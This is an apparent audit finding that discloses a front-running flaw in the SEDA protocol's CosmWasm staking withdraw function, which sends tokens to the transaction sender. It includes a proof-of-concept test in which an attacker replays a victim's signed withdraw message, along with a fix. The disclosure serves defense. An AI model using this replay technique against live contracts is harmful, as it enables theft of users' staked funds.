# [H-2] Front run attack in Core Contracts allows malicious user to steal funds


#### Severity: High

Impact: High

Likelihood: High



# Description

This vulnerability applicable to CosmWasm Core Contracts. Cosmos-based blockchains, like SEDA, can be affected by front-running attacks. An attacker can to monitor a mempool for a withdrawing transaction and to duplicate it with a higher fees to get it processed first. And then steal the funds. 

https://github.com/sherlock-audit/2024-12-seda-protocol/blob/main/seda-chain-contracts/contract/src/msgs/staking/execute/withdraw.rs#L36-L39

```rust
impl ExecuteHandler for execute::withdraw::Execute {
    /// Sends tokens back to the sender that are marked as pending withdrawal.
    fn execute(self, deps: DepsMut, env: Env, info: MessageInfo) -> Result<Response, ContractError> {
        
        // .....
        
        // send the tokens back to the executor
        let bank_msg = BankMsg::Send {
            to_address: info.sender.to_string(),			// <==
            amount:     coins(self.amount.u128(), token),
        };

		// .....
        
    }
}

```



# Impact

This vulnerability allows to steal a significant amount of funds.



# Proof of Concepts

`contract/src/msgs/staking/tests.rs`

```rust
#[test]
fn frontrun_withdraw_test() {
    let mut test_info = TestInfo::init();

    // someone registers a data request executor
    let mut anyone = test_info.new_executor("anyone", Some(2));
    let mut attacker = test_info.new_executor("attacker", Some(0));

    test_info.stake(&mut anyone, Some("memo".to_string()), 2).unwrap();

    // unstake and withdraw all tokens
    test_info.unstake(&anyone, 2).unwrap();

    let amount = 2;
    let seq = test_info.get_account_sequence(anyone.pub_key());

    let factory = execute::withdraw::Execute::factory(
        anyone.pub_key_hex(),
        amount,
        test_info.chain_id(),
        test_info.contract_addr_str(),
        seq,
    );
    let proof = anyone.prove(factory.get_hash());
    let msg = factory.create_message(proof);

    ////
    let attacker_dup_msg = msg.clone();
    test_info.execute::<()>(&mut attacker, &attacker_dup_msg).unwrap();
    ////

    let err = test_info.execute::<()>(&mut anyone, &msg).unwrap_err();

    assert_eq!(err.to_string(), "verify: invalid proof");

    let anyone_bal = test_info.executor_balance("anyone");
    let attacker_bal = test_info.executor_balance("attacker");

    assert_eq!(anyone_bal, 0);
    assert_eq!(attacker_bal, 2);
}

```



# Recommended mitigation

Add `address` field to `Staker`.

`contract/src/msgs/staking/execute/stake.rs`

```rust
                let executor = Staker {
                    memo:                      self.memo.clone(),
                    tokens_staked:             amount,
                    tokens_pending_withdrawal: Uint128::zero(),
+                    address:                   info.sender.to_string(),
                };
                state::STAKERS.insert(deps.storage, public_key, &executor)?;
```

`contract/src/msgs/staking/execute/withdraw.rs`

```rust
        // send the tokens back to the executor
        let bank_msg = BankMsg::Send {
+            to_address: executor.address,
-            to_address: info.sender.to_string(),
            amount:     coins(self.amount.u128(), token),
        };

```
